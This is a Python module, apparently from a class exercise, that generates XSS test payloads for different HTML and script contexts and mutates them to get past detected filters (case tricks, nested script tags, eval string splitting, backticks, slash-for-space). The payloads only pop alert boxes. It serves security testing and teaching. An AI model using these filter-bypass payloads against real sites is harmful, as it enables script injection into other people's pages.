# payload_generator.py
from modelos import Contexto
from payloads import payloads

class PayloadGenerator:
    def dict_contextos(self):
        return payloads
        
    def generar_payloads_base(self, contexto: Contexto) -> list[str]:
        """Devuelve una lista de payloads base dependiendo del contexto (Punto 7)."""
        
        payloads_base_por_contexto = self.dict_contextos()
        
        if contexto == Contexto.PLAIN_TEXT:
            return payloads_base_por_contexto["PLAIN_TEXT"].copy()
        elif contexto == Contexto.ATTRIBUTE:
            return payloads_base_por_contexto["ATTRIBUTE"].copy()
        elif contexto in (Contexto.SCRIPT_SINGLE_QUOTE, Contexto.SCRIPT_DOUBLE_QUOTE, Contexto.SCRIPT_NONE_QUOTE):
            # Usamos funciones base crudas para inyectar si estamos dentro de un script
            base_js = ["alert(1)", "prompt(1)", "confirm(1)", "console.log(1)"]
            adapted = set()
            
            for p in base_js:
                if contexto == Contexto.SCRIPT_SINGLE_QUOTE:
                    adapted.add(f"'; {p}//")
                    adapted.add(f"'-{p}-'")
                elif contexto == Contexto.SCRIPT_DOUBLE_QUOTE:
                    adapted.add(f'\"; {p}//')
                    adapted.add(f'\"-{p}-\"')
                elif contexto == Contexto.SCRIPT_NONE_QUOTE:
                    adapted.add(f"; {p}//")
                    adapted.add(f"{p}//")
                    
            # Añadimos también cerrojos de script completos en caso de que todo lo anterior falle
            adapted.add("</script><script>alert(1)</script>")

            return list(adapted)
        elif contexto == Contexto.COMENTARIO:
            return payloads_base_por_contexto["COMENTARIO"].copy()
        else:
            return payloads_base_por_contexto["OTHER"].copy()
    
    # Basados en parte en los ejemplos de clase y PayloadsAllTheThings
    # https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md
    def aplicar_evasion(self, payload: str, filtros_detectados: list[str]) -> list[str]:
        """Aplica mutaciones al payload en función de los filtros detectados (Punto 6).
        Lógica de mutación de cadena .replace(), backticks, etc."""
        variantes = set([payload])

        # Convertimos la lista de filtros a uno de solo strings para buscar fácilmente
        # Unimos todos los filtros detectados en una sola cadena para buscar subcadenas como 'script'
        filtros_str = "".join(filtros_detectados).lower()

        if "script" in filtros_str:
            variantes.discard(payload) # Auto eliminamos el original al entrar al if porque sabemos que fallará
            variantes.add(payload.replace("script", "sCrIpt").replace("SCRIPT", "sCrIpt"))
            
            # Anidamiento para bypass de borrado de etiqueta y combinado con mayúsculas/minúsculas
            variantes.update({payload.replace("<script>", "<scr<script>ipt>").replace("</script>", "</scr</script>ipt>"), payload.replace("<script>", "<scr<sCrIpt>ipt>").replace("</script>", "</scr</sCrIpt>ipt>")})

        if "alert" in filtros_str:
            variantes.discard(payload)
            variantes.add(payload.replace("alert", "prompt"))
            variantes.add(payload.replace("alert", "confirm"))
            variantes.add(payload.replace("alert(", "eval('ale'+'rt(1)');//"))
            variantes.add(payload.replace("alert", "window['alert']"))

        if "(" in filtros_str or ")" in filtros_str:
            variantes.discard(payload)
            # Cambiamos paréntesis por backticks (Template Literals) solo si los paréntesis están siendo filtrados
            variantes.add(payload.replace('(1)', '`1`'))

        if " " in filtros_str:
            variantes.discard(payload)
            variantes.add(payload.replace(" ", "/"))

        if "onerror" in filtros_str or "onload" in filtros_str:
            variantes.discard(payload)
            variantes.add(payload.replace("onerror", "onErRor").replace("onload", "onLoAd"))

        return list(variantes)
